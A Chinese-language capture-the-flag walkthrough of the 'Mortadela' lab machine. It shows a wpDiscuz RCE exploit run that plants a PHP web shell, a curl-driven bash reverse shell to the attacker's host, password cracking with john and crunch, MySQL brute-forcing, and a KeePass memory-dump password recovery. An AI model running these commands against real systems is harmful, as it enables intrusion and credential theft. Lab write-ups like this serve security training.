# Mortadela

2025.03.07 https://thehackerslabs.com/mortadela/

## Ip

192.168.5.39

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

80 web 发现 wordpress http://192.168.5.39/wordpress/ , 先 wpscan 枚举用户、主题、插件。

枚举到一个用户 mortadela ， wpdiscuz 7.0.4 存在未授权的 RCE 漏洞 https://www.exploit-db.com/exploits/49967 进行利用(首页上找到 Hello world! 的地址)：

```
python3 49967.py -u http://192.168.5.39/wordpress -p /index.php/2024/04/01/hola-mundo/
```

上传了 web shell : http://192.168.5.39/wordpress/wp-content/uploads/2025/03/kyeeokpkslauami-1741335246.7189.php , pass 为 cmd 。 进行连接验证：

```
curl http://192.168.5.39/wordpress/wp-content/uploads/2025/03/kyeeokpkslauami-1741335246.7189.php?cmd=ls
```

可以访问，直接反弹 shell：

```
curl -G --data-urlencode 'cmd=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' http://192.168.5.39/wordpress/wp-content/uploads/2025/03/kyeeokpkslauami-1741335246.7189.php
```

先看 wp-config.php 文件：

```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'lolalolitalola' );
define( 'DB_HOST', 'localhost' );
```

上面的数据库密码不是用户 mortadela 的密码。

在 /opt 中发现 muyconfidencial.zip , 有密码，下载到 kali 上 john 破解，zip 解压密码 pinkgirl ， 得到 keeppass 文件，john 不能爆出密码。 再看 KeePass.DMP 文件，不能拿到 kdbx 文件的密码。

现在没有其他方向，还有一个 mysql 3306 的开放端口，看看能不能爆破到 root 用户的密码，有可能在数据库中有密码信息：

```
[3306][mysql] host: 192.168.5.39   login: root   password: cassandra
```

登陆数据库，发现数据库 confidencial :

```
MariaDB [confidencial]> select * from usuarios;
+-----------+------------------+
| usuario   | contraseña       |
+-----------+------------------+
| mortadela | Juanikokukunero8 |
+-----------+------------------+
```

拿到了 mortadela 的 ssh 登陆密码 Juanikokukunero8 ，先读到了 user flag:

```
mortadela@mortadela:~$ cat user.txt
sajferoifgvpcnsorvn
```

下面要解决 keepass 的 dmp 文件，找到密码，使用这个利用 https://github.com/vdohney/keepass-password-dumper

```
crunch 14 14 -f /usr/share/crunch/charset.lst mixalpha-numeric -t @@ritrini12345 -o pass.txt

Maritrini12345
```

使用密码 Maritrini12345 打开 keepass 文件，拿到 root 的登陆密码 Juanikonokukunero 拿到 root flag：

```
root@mortadela:~# cat root.txt
aiugfurebaoergivthneioerv
```
